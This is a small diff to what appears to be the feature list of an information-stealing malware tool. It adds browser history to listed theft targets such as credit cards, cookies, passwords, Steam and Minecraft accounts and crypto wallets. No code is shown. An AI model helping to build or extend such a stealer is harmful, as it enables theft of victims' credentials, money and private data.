@@ -28,6 +28,7 @@ others features :
 -> Credit Cards (All browsers)
 -> Cookies (All browsers)
 -> Passwords (All browsers)
+-> History (All browsers)
 -> Steam Stealer 
 -> Minecraft Stealer
 -> Wallets Stealer (All wallets)
